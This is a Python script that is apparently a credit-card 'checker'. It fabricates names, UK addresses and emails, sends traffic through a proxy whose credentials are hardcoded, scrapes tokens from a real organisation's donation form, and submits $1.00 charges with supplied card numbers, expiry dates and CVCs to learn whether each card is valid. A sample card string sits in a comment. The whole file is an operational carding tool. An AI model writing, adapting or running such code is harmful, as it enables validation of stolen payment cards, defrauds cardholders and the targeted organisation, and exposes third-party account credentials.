import random
import string
import requests
from user_agent import generate_user_agent
from proxy import reqproxy, make_request
import json
import re

#============================================
def generate_full_name():
    first_names = ["Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah", "Omar", "Layla", "Youssef", "Nour", "Hannah", "Yara", "Khaled", "Sara", "Lina", "Nada", "Hassan", "Amina", "Rania", "Hussein", "Maha", "Tarek", "Laila", "Abdul", "Hana", "Mustafa", "Leila", "Kareem", "Hala", "Karim", "Nabil", "Samir", "Habiba", "Dina", "Youssef", "Rasha", "Majid", "Nabil", "Nadia", "Sami", "Samar", "Amal", "Iman", "Tamer", "Fadi", "Ghada", "Ali", "Yasmin", "Hassan", "Nadia", "Farah", "Khalid", "Mona", "Rami", "Aisha", "Omar", "Eman", "Salma", "Yahya", "Yara", "Husam", "Diana", "Khaled", "Noura", "Rami", "Dalia", "Khalil", "Laila", "Hassan", "Sara", "Hamza", "Amina", "Waleed", "Samar", "Ziad", "Reem", "Yasser", "Lina", "Mazen", "Rana", "Tariq", "Maha", "Nasser", "Maya", "Raed", "Safia", "Nizar", "Rawan", "Tamer", "Hala", "Majid", "Rasha", "Maher", "Heba", "Khaled", "Sally"]
    last_names = ["Khalil", "Abdullah", "Alwan", "Shammari", "Maliki", "Smith", "Johnson", "Williams", "Jones", "Brown", "Garcia", "Martinez", "Lopez", "Gonzalez", "Rodriguez", "Walker", "Young", "White", "Ahmed", "Chen", "Singh", "Nguyen", "Wong", "Gupta", "Kumar", "Gomez", "Lopez", "Hernandez", "Gonzalez", "Perez", "Sanchez", "Ramirez", "Torres", "Flores", "Rivera", "Silva", "Reyes", "Alvarez", "Ruiz", "Fernandez", "Valdez", "Ramos", "Castillo", "Vazquez", "Mendoza", "Bennett", "Bell", "Brooks", "Cook", "Cooper", "Clark", "Evans", "Foster", "Gray", "Howard", "Hughes", "Kelly", "King", "Lewis", "Morris", "Nelson", "Perry", "Powell", "Reed", "Russell", "Scott", "Stewart", "Taylor", "Turner", "Ward", "Watson", "Webb", "White", "Young"]
    return random.choice(first_names), random.choice(last_names)

def generate_address():
    cities = ["London", "Birmingham", "Manchester", "Liverpool", "Leeds", "Glasgow", "Sheffield", "Edinburgh", "Bristol", "Cardiff"]
    states = ["England", "England", "England", "England", "England", "Scotland", "England", "Scotland", "England", "Wales"]
    streets = ["Baker St", "Oxford St", "High St", "King's Rd", "Abbey Rd", "The Strand", "Regent St", "Whitehall", "Fleet St", "Pall Mall"]
    zip_codes = ["SW1A 1AA", "W1D 3QF", "M1 1AE", "N1C 4AG", "EC1A 1BB", "SE1 8XX", "B1 1AA", "RG1 8DN", "SW1E 5RS", "B2 5DT"]
    
    city = random.choice(cities)
    street_address = f"{random.randint(1, 999)} {random.choice(streets)}"
    zip_code = random.choice(zip_codes)
    return street_address, city, "GB", zip_code, f"07{random.randint(100000000, 999999999)}"

def generate_email():
    return f"user{random.randint(10000,99999)}@example.com"

def generate_username():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))

def generate_random_code(length=32):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

#============================================
def Tele(ccx):
    proxy_str = "brd.superproxy.io:33335:brd-customer-hl_5c664e64-zone-datacenter_proxy1:0bnfn02i83lj"
    session, ip = reqproxy(proxy_str)
    #print(f"IP Address: {ip}")
    ccx=ccx.strip()
    n = ccx.split("|")[0]
    mm = ccx.split("|")[1]
    yy = ccx.split("|")[2]
    cvc = ccx.split("|")[3]
    if "20" in yy:#Mo3gza
        yy = yy.split("20")[1]
    elif "01" in mm or "02" in mm or "01" in mm or "03" in mm or "04" in mm or "05" in mm or "06" in mm or "07" in mm or "08" in mm or "09" in mm:
        mm = mm.split("0")[1]

    user = generate_user_agent()
    r = requests.Session()
    r.verify = False
    
    first_name, last_name = generate_full_name()
    kaddress, city, country, postcode, phone =     generate_address()
    kaddress, city, country, postcode, phone = generate_address()
    email = generate_email()
    username = generate_username()
    corr = generate_random_code()
    sess = generate_random_code()
    nr = random.randint(100000, 999999)
    lr = random.randint(1000, 9999)
    
    headers = {
        'authority': 'www.bethpark.org',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'cache-control': 'max-age=0',
        #'if-modified-since': 'Tue, 28 Dec 2021 09:41:13 GMT',
        'referer': 'https://www.google.com/',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'cross-site',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
    }
    
    response = session.get('https://www.bethpark.org/other-payment/', headers=headers)
    
    ajax = re.search(r"&amp;hash=(.*?)'", response.text).group(1)
    currency = re.search(r"data-currency='USD' value='(.*?)'", response.text).group(1)
    state = re.search(r"name='state_1' value='(.*?)'", response.text).group(1)
    version = re.search(r'"version_hash":"(.*?)"', response.text).group(1)
    #print(ajax)
    
    cookies = {
        '_ga_S01GCQ9W83': 'GS2.1.s1777421530$o1$g0$t1777421530$j60$l0$h0',
        '_ga': 'GA1.2.521965049.1777421531',
        '_gid': 'GA1.2.1042330939.1777421531',
        'wcsid': '0Hdy7nrRUtkTcgqH6S7Lx0I0dborzA5a',
        'hblid': 'w7bzhsGG8rs3uWLk6S7Lx0I0Aaz05drb',
        'cf_clearance': '0OsJydBMGQTadQoYqroYqJ3RyRTLDPgc6UcXnoNj7Fk-1777421532-1.2.1.1-tq6mIV35w3hp.GLLDrDiWCDcwrDOOo4lULpaUiWWcRrkqi6G9wWcyyBYKnNBET9o_ittJNOLOhyOQpYOhhnhI4yarCMEdQyKS.Mpn8JpyjdD2J35ZFdnWj7u0pIoXbUf8ZqD2Aoehrc5EXP1ZNJtoGfVrfwUpBv0BZQPQ6cf3o5wN_fY8z.dro09Op9vEJQjROdp.Aa1J9qIfcjaM__Hz5UiDA2HcbCiaRb9.IkM8F3IV7hTZG3EYiSPcuBIrQvU3Qe2wbsurIDIdoijLLQLz4sbO_Yx79O9hGvtARQT3UQuyKoFGesYkfHbUe_ZMUx__xFwSAbE1f0CrsDTgsb0PA',
        '__cf_bm': 'uJKLK51mPJeTqGsbtQtRBGyfvvU8lxs_3JBVQ7TU.n0-1777421532.296741-1.0.1.1-Q54Ai4TkCYTFpcHqd1F93IYn2z80c8GqnFBisoDujPNr4w2OyzHwd499uYi_HlYASopSnQM03TKUqB0gdOcRNPKN885qmJscRYDDzwrL.NaksjJqF4yPL8BSPJgTJdwc',
        '_okdetect': '%7B%22token%22%3A%2217774215317640%22%2C%22proto%22%3A%22about%3A%22%2C%22host%22%3A%22%22%7D',
        'olfsk': 'olfsk23099488512443234',
        '_okbk': 'cd4%3Dtrue%2Cvi5%3D0%2Cvi4%3D1777421532176%2Cvi3%3Dactive%2Cvi2%3Dfalse%2Cvi1%3Dfalse%2Ccd8%3Dchat%2Ccd6%3D0%2Ccd5%3Daway%2Ccd3%3Dfalse%2Ccd2%3D0%2Ccd1%3D0%2C',
        '_ok': '3825-592-10-7286',
        '_oklv': '1777421591402%2C0Hdy7nrRUtkTcgqH6S7Lx0I0dborzA5a',
    }
    
    headers = {
        'authority': 'www.bethpark.org',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'cache-control': 'max-age=0',
        #'content-type': 'multipart/form-data; boundary=----WebKitFormBoundary9znuuEWrFNbdagNn',
        # 'cookie': '_ga_S01GCQ9W83=GS2.1.s1777421530$o1$g0$t1777421530$j60$l0$h0; _ga=GA1.2.521965049.1777421531; _gid=GA1.2.1042330939.1777421531; wcsid=0Hdy7nrRUtkTcgqH6S7Lx0I0dborzA5a; hblid=w7bzhsGG8rs3uWLk6S7Lx0I0Aaz05drb; cf_clearance=0OsJydBMGQTadQoYqroYqJ3RyRTLDPgc6UcXnoNj7Fk-1777421532-1.2.1.1-tq6mIV35w3hp.GLLDrDiWCDcwrDOOo4lULpaUiWWcRrkqi6G9wWcyyBYKnNBET9o_ittJNOLOhyOQpYOhhnhI4yarCMEdQyKS.Mpn8JpyjdD2J35ZFdnWj7u0pIoXbUf8ZqD2Aoehrc5EXP1ZNJtoGfVrfwUpBv0BZQPQ6cf3o5wN_fY8z.dro09Op9vEJQjROdp.Aa1J9qIfcjaM__Hz5UiDA2HcbCiaRb9.IkM8F3IV7hTZG3EYiSPcuBIrQvU3Qe2wbsurIDIdoijLLQLz4sbO_Yx79O9hGvtARQT3UQuyKoFGesYkfHbUe_ZMUx__xFwSAbE1f0CrsDTgsb0PA; __cf_bm=uJKLK51mPJeTqGsbtQtRBGyfvvU8lxs_3JBVQ7TU.n0-1777421532.296741-1.0.1.1-Q54Ai4TkCYTFpcHqd1F93IYn2z80c8GqnFBisoDujPNr4w2OyzHwd499uYi_HlYASopSnQM03TKUqB0gdOcRNPKN885qmJscRYDDzwrL.NaksjJqF4yPL8BSPJgTJdwc; _okdetect=%7B%22token%22%3A%2217774215317640%22%2C%22proto%22%3A%22about%3A%22%2C%22host%22%3A%22%22%7D; olfsk=olfsk23099488512443234; _okbk=cd4%3Dtrue%2Cvi5%3D0%2Cvi4%3D1777421532176%2Cvi3%3Dactive%2Cvi2%3Dfalse%2Cvi1%3Dfalse%2Ccd8%3Dchat%2Ccd6%3D0%2Ccd5%3Daway%2Ccd3%3Dfalse%2Ccd2%3D0%2Ccd1%3D0%2C; _ok=3825-592-10-7286; _oklv=1777421591402%2C0Hdy7nrRUtkTcgqH6S7Lx0I0dborzA5a',
        'origin': 'https://www.bethpark.org',
        'referer': 'https://www.bethpark.org/other-payment/',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'iframe',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
    }
    
    files = [
        ('input_11', (None, '')),
        ('input_1.3', (None, f'{first_name}')),
        ('input_1.6', (None, f'{last_name}')),
        ('input_2', (None, f'yellhtetgaung{nr}@gmail.com')),
        ('input_3', (None, f'(430) 300-{lr}')),
        ('input_4', (None, '')),
        ('input_5', (None, '1')),
        ('input_6', (None, '$1.00')),
        ('input_7', (None, '$1.00')),
        ('input_8.1', (None, f'{n}')),
        ('input_8.2[]', (None, f'{mm}')),
        ('input_8.2[]', (None, f'20{yy}')),
        ('input_8.3', (None, f'{cvc}')),
        ('input_8.5', (None, f'{first_name} {last_name}')),
        ('gform_ajax', (None, f'form_id=1&title=&description=&tabindex=0&theme=gravity-theme&styles=[]&hash={ajax}')),
        ('gform_submission_method', (None, 'iframe')),
        ('gform_theme', (None, 'gravity-theme')),
        ('gform_style_settings', (None, '[]')),
        ('is_submit_1', (None, '1')),
        ('gform_submit', (None, '1')),
        ('gform_currency', (None, f'{currency}')),
        ('gform_unique_id', (None, '')),
        ('state_1', (None, f'{state}')),
        ('gform_target_page_number_1', (None, '0')),
        ('gform_source_page_number_1', (None, '1')),
        ('gform_field_values', (None, '')),
        ('version_hash', (None, f'{version}')),
        ('gform_submission_speeds', (None, '{"pages":{"1":[23340]}}')),
    ]
    
    response = session.post('https://www.bethpark.org/other-payment/', #cookies=cookies, 
    headers=headers, files=files)
    
    try:
        result = re.search(r"class='gfield_description validation_message gfield_validation_message'><!-- (.*?)<\/div><\/fieldset>", response.text).group(1)
    except:
        result = re.search(r"class='gform_confirmation_message_1 gform_confirmation_message'>(.*?)<\/div><\/div>", response.text).group(1)
    return result
    
#test_card = "5164998784300556|06|2029|155"
#print(Tele(test_card))
